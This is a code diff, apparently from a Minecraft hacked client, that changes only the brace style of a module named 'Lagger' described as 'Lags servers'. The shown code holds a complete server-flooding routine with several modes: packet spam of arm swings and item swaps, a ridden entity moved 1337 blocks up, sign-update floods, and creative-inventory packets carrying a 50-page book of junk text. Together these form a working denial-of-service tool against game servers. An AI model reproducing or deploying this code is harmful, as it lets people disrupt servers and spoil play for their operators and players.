@@ -21,19 +21,16 @@ import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;
 
 import java.util.ArrayList;
 
-public class Lagger extends Module
-{
+public class Lagger extends Module {
     final Minecraft mc = Minecraft.getMinecraft();
     Setting.mode mode;
     Setting.i packets;
 
-    public Lagger()
-    {
+    public Lagger() {
         super("Lagger", Category.Misc, "Lags servers");
     }
 
-    public void setup()
-    {
+    public void setup() {
         ArrayList<String> modes = new ArrayList<>();
         modes.add("Boxer");
         modes.add("Swap");
@@ -45,28 +42,22 @@ public class Lagger extends Module
     }
 
     @Listener
-    public void onUpdate(UpdateEvent event)
-    {
-        switch (mode.getValue())
-        {
+    public void onUpdate(UpdateEvent event) {
+        switch (mode.getValue()) {
             case "Boxer":
-                for (int i = 0; i <= packets.getValue(); i++)
-                {
+                for (int i = 0; i <= packets.getValue(); i++) {
                     mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                 }
                 break;
             case "Swap":
-                for (int i = 0; i <= packets.getValue(); i++)
-                {
+                for (int i = 0; i <= packets.getValue(); i++) {
                     mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
                 }
                 break;
             case "Movement":
-                for (int i = 0; i <= packets.getValue(); i++)
-                {
+                for (int i = 0; i <= packets.getValue(); i++) {
                     final Entity riding = mc.player.getRidingEntity();
-                    if (riding != null)
-                    {
+                    if (riding != null) {
                         riding.posX = mc.player.posX;
                         riding.posY = mc.player.posY + 1337;
                         riding.posZ = mc.player.posZ;
@@ -75,14 +66,11 @@ public class Lagger extends Module
                 }
                 break;
             case "Sign":
-                for (TileEntity te : mc.world.loadedTileEntityList)
-                {
-                    if (te instanceof TileEntitySign)
-                    {
+                for (TileEntity te : mc.world.loadedTileEntityList) {
+                    if (te instanceof TileEntitySign) {
                         final TileEntitySign tileEntitySign = (TileEntitySign) te;
 
-                        for (int i = 0; i <= packets.getValue(); i++)
-                        {
+                        for (int i = 0; i <= packets.getValue(); i++) {
                             mc.player.connection.sendPacket(new CPacketUpdateSign(tileEntitySign.getPos(), new TextComponentString[]{new TextComponentString("give"), new TextComponentString("riga"), new TextComponentString("the"), new TextComponentString("green book")}));
                         }
                     }
@@ -92,8 +80,7 @@ public class Lagger extends Module
                 final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                 final NBTTagList pages = new NBTTagList();
 
-                for (int page = 0; page < 50; page++)
-                {
+                for (int page = 0; page < 50; page++) {
                     pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                 }
 
@@ -103,8 +90,7 @@ public class Lagger extends Module
                 tag.setTag("pages", pages);
                 itemStack.setTagCompound(tag);
 
-                for (int i = 0; i <= packets.getValue(); i++)
-                {
+                for (int i = 0; i <= packets.getValue(); i++) {
                     mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
                     //mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                 }
